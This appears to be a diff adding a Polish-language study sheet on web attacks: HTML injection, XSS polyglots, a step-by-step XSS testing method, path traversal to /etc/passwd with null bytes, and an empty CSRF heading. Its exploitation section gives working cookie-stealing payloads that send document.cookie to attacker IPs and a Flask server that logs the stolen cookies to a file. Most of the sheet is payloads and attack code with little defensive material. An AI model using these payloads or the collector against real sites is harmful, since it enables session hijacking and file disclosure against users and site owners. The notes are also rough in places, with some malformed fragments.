@@ -1,0 +1,148 @@
+
+
+Bezpieczne wstawianie niezaufanego inputu do HTMLa
+
+.innerText
+
+
+Niebezpieczne - kod wstawiony przez usera może zostać wykonany
+.innerText
+
+
+HTML injection
+
+?url=<input form>dsfsdfsd</form?
+
+
+DOM events
+
+Wstrzykiwanie tagów HTML jest niebezpieczne bo można zrobić to
+
+<h1 onload="javascript:alert("dupa")>fsfds</h1>
+<h1 onhover
+<h1 onclick
+
+
+
+XSS
+
+
+Ultimate XSS:
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+XSS test:
+'';!--"<XSS>=&{()}
+look for <XSS verses &lt;XSS
+
+
+
+-------------------------------------------------
+Metodyka:
+-------------------------------------------------
+testujemy dodawanie komentarza
+
+1. <script>alert(1)</script>
+2. <script>prompt(1)</script> - może alert jest blokowany?
+3, <h1>dfsdf</h1> - czy działają tagi html
+4. <h1 onmouseover="javascript"
+5. <img src=javascript
+6. <img autofocus onfocus=javascript
+
+
+
+[input] = " onmouseover="javascript:alert(3)" c="
+
+
+" onmouseover=javascript:alert(document.domain); c="
+
+in meta tag (encoding)
+"><script>alert(1)</script>
+
+asdd HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS')
+
+Protokoły interpretowane przez przeglądarkę:
+javascript:
+data:
+
+Link zawierający złośliwy JS można opublikować na PasteBin
+
+-------------------------------------------------
+XSS expoitation:
+-------------------------------------------------
+
+Kradzierz ciastek (przekierowanie)
+window.location="http://192.168.80.211/endpoint?cookie="+ document.cookie
+
+Ulepszona kradzierz ciastek przez przekierowanie jednorazowe:
+<script>if (document.cookie.indexOf("hasbeenpwnd") == -1){ document.cookie = "hasbeenpwnd=hasbeenpwnd"; document.location = "http://172.16.156.132?cookies="+document.cookie; };</script>&txtName=test&btnSign=Sign+Guestbook
+
+## Serwer do odbioru ciastek (python + flask)
+from flask import Flask, request
+from flask.ext.cors import CORS
+from flask import redirect
+
+app = Flask(__name__)
+app.debug = True
+
+CORS(app)
+
+@app.route('/')
+def index():
+
+    cookies = request.args.get('cookies')
+    with open('cookies.txt', 'a') as fd:
+        fd.write(cookies)
+    return redirect( request.referrer )
+
+app.run(host='0.0.0.0', port=80)
+
+
+
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open("POST", "http://192.168.1.191/update", true);
+xmlhttp.send(JSON.stringify({hostname: window.location.host, session:document.cookie}));
+
+Same Origin Policy! nie pozwoli wyświetlić zasobu z innej domeny niż nasza
+Co porównuje SOP:
+protokół:// subdomena.domena:TLD:80
+
+
+
+<script>if (document.cookie.indexOf("hasbeenpwnd") == -1){ document.cookie = "hasbeenpwnd=hasbeenpwnd"; document.location = "http://172.16.156.132?cookies="+document.cookie; };</script>&txtName=test&btnSign=Sign+Guestbook
+
+
+
+
+
+
+
+
+
+
+
+----------------------
+CSRF:
+----------------------
+
+
+-----------------------
+Path traversal
+-----------------------
+
+
+null bytes - do kasowania znaków
+
+ścieżka do pliku na serwerze
+
+system.load_file("/var/www/html/apka/static" + nazwa_pliku + ".txt")
+
+wstrzykujemy
+../../../../../../../../etc/passwd%0x00
+
+%00 terminuje stringa, różny dla różnych systemów
+
+
+
+
+
+
